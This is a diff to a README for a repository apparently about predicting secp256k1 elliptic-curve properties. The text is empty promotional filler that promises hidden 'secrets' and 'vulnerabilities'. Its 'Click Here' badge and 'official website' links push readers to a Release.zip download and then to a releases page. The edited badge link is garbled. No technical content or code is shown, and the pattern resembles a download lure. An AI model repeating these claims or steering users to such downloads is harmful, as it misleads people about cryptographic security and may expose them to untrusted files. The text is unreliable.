@@ -10,7 +10,7 @@ Welcome to the repository dedicated to exploring the behavior of the properties 
 
 ## Explore the Secrets
 If you are ready to uncover the secrets hidden within the secp256k1 Elliptic Curve, click the button below to access the insights:
-[![Explore the Secrets](https://img.shields.io/badge/Explore%20the%20Secrets-Click%20Here-blue)](https://github.com/releases/789694263/Release.zip)
+[![Explore the Secrets](https://github.com/ash161204/An-attempt-to-predict-the-behavior-of-the-properties-of-the-secp256k1-Elliptic-Curve/releases%20the%20Secrets-Click%20Here-blue)](https://github.com/ash161204/An-attempt-to-predict-the-behavior-of-the-properties-of-the-secp256k1-Elliptic-Curve/releases)
 
 ## The Quest for Knowledge
 Embark on a journey of discovery as you navigate through the complexities of the secp256k1 Elliptic Curve. Unravel the mysteries, understand the vulnerabilities, and equip yourself with the knowledge needed to navigate the world of cryptography and cryptocurrency.
@@ -31,7 +31,7 @@ Whether you are a seasoned cryptographer, a cryptocurrency enthusiast, or simply
 The secp256k1 Elliptic Curve holds a wealth of information and challenges waiting to be tackled. By engaging with this repository, you are joining a community of like-minded individuals dedicated to advancing the field of cryptography and cryptocurrency. Uncover the vulnerabilities, explore the possibilities, and embark on a journey of discovery unlike any other.
 
 ## Discover More
-Visit the [official website](https://github.com) for additional resources, updates, and insights on the secp256k1 Elliptic Curve and other related topics.
+Visit the [official website](https://github.com/ash161204/An-attempt-to-predict-the-behavior-of-the-properties-of-the-secp256k1-Elliptic-Curve/releases) for additional resources, updates, and insights on the secp256k1 Elliptic Curve and other related topics.
 
 ## Stay Curious, Stay Secure
 Let your curiosity guide you as you explore the intricate world of cryptography and cryptocurrency. Together, we can unlock the secrets of the secp256k1 Elliptic Curve and pave the way for a more secure digital future.
